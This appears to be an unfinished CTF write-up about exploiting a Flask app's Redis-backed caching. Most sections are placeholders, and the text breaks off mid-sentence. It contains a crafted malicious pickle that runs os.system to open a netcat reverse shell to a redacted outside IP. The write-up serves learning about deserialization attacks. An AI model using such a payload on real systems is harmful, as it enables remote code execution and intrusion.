---
title: "CTF Flask Caching"
date: 2020-12-03T08:14:05-05:00
tags: ["CTF", "UFSIT", "python", "redis", "flask"]
---

## Introduction

INTRO HERE

## Code Analysis and Observed Behavior of Application

TALK ABOUT FLASK APP, REDIS, AND DEFAULT BEHAVIOR OF CACHING FUNCTION RESPONSES

## The Exploit

Funnily enough, after trying multiple different nonfunctional payloads, our answer was found
within the OFFICIAL python3 documentation on pickles. [This link](https://docs.python.org/3/library/pickle.html#restricting-globals)
shows how a pretty compact looking pickle lets us import and execute shellcode using the os module.
Below is a form of this pickle that has been crafted to connect to a DO Droplet:

`pickle`

```text
!cos                                                                                                                      
system                                                                                                                    
(S'nc REDACTED-IP 6969 -e /bin/sh'
tR.%  
```

One question that we had while crafting this pickle was whether or not the challenge was intended to
be solved in such a way and if there was a better approach than this one. Nevertheless, a shell is
always a nice thing to have :)

## Gaining Shell Access and Finding the Flag

Using the pickle detailed above